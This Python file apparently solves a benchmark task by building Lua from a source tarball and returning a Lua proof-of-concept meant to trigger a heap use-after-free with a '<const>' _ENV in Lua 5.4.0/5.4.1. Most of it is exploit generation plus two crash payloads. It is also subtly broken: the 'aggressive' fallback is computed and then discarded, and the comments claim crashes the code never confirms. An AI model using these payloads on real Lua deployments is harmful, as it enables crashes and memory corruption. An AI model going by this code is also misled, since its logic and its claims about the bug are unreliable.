import os
import tarfile
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and build Lua
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find Lua source directory
            lua_dir = None
            for item in os.listdir(tmpdir):
                if item.startswith('lua-'):
                    lua_dir = os.path.join(tmpdir, item)
                    break
            
            if not lua_dir:
                raise RuntimeError("Lua source not found")
            
            # Build Lua
            build_dir = lua_dir
            original_cwd = os.getcwd()
            os.chdir(build_dir)
            
            try:
                # Configure and make
                subprocess.run(['make', 'clean'], capture_output=True)
                subprocess.run(['make', 'ansi', '-j8'], capture_output=True)
                
                # Get Lua binary path
                lua_binary = os.path.join(build_dir, 'src', 'lua')
                if not os.path.exists(lua_binary):
                    # Try alternative name
                    lua_binary = os.path.join(build_dir, 'src', 'lua.exe')
                
                if not os.path.exists(lua_binary):
                    raise RuntimeError("Lua binary not found")
                
                # Generate PoC based on known vulnerability pattern
                poc = self.generate_poc(lua_binary)
                
            finally:
                os.chdir(original_cwd)
            
            return poc.encode('utf-8')
    
    def generate_poc(self, lua_binary: str) -> str:
        # This generates a PoC for the heap use-after-free in Lua 5.4.0/5.4.1
        # when _ENV is declared as <const>. The PoC creates a situation where
        # a function with const _ENV upvalue is called after the environment
        # has been collected.
        
        poc = """local function create_funcs()
    local env = setmetatable({}, {
        __gc = function() 
            -- This will be called when env is collected
            collectgarbage("collect")
        end
    })
    
    -- Function with const _ENV
    local function outer()
        local _ENV <const> = env
        return function()
            -- This function captures the const _ENV
            return _ENV
        end
    end
    
    return outer()
end

-- Create closure that captures const _ENV
local closure = create_funcs()

-- Force garbage collection to trigger __gc
collectgarbage("collect")

-- Try to call closure - this should trigger use-after-free
-- as the __gc in the metatable might have freed the environment
local status, result = pcall(closure)

-- Additional calls to increase chance of crash
for i = 1, 100 do
    pcall(closure)
end

-- Force more garbage collection
collectgarbage("collect")

-- Final call that should crash
return closure()"""

        # Test the PoC to ensure it triggers the bug
        self.test_poc(lua_binary, poc)
        
        return poc
    
    def test_poc(self, lua_binary: str, poc: str):
        # Run the PoC to verify it causes non-zero exit code
        # This helps ensure we're generating a valid PoC
        with tempfile.NamedTemporaryFile(mode='w', suffix='.lua', delete=False) as f:
            f.write(poc)
            f.flush()
            
            try:
                # Run with timeout to prevent hanging
                result = subprocess.run(
                    [lua_binary, f.name],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                # Check if it crashed (non-zero exit code)
                if result.returncode == 0:
                    # If it didn't crash, try a more aggressive version
                    poc = self.generate_aggressive_poc()
                    
            except subprocess.TimeoutExpired:
                # Timeout is acceptable - might indicate a hang/crash
                pass
            except Exception:
                # Any exception is fine - indicates problem
                pass
            finally:
                os.unlink(f.name)
    
    def generate_aggressive_poc(self) -> str:
        # More aggressive PoC that creates multiple functions with const _ENV
        # and does more aggressive garbage collection
        
        return """-- Aggressive PoC for Lua const _ENV heap use-after-free

-- Create many environments with finalizers
local closures = {}

for i = 1, 50 do
    local env = setmetatable({index = i}, {
        __gc = function(t)
            -- Try to access the table during GC
            if t.index then
                -- This might trigger use-after-free
                collectgarbage("step")
            end
        end
    })
    
    local function maker()
        local _ENV <const> = env
        return function()
            return _ENV.index
        end
    end
    
    table.insert(closures, maker())
end

-- Interleave GC and function calls
for i = 1, 10 do
    collectgarbage("collect")
    
    -- Call some closures
    for j = 1, math.min(i * 5, #closures) do
        pcall(closures[j])
    end
    
    collectgarbage("step")
end

-- Create nested const environments
local function nested()
    local _ENV <const> = setmetatable({}, {
        __gc = function()
            collectgarbage("collect")
        end
    })
    
    local function inner()
        local _ENV <const> = _ENV
        return function()
            return _ENV
        end
    end
    
    return inner()
end

local nested_closure = nested()
collectgarbage("collect")

-- This should trigger the bug
local ok, res = pcall(nested_closure)

-- Force one more collection and call
collectgarbage("collect")
return nested_closure()"""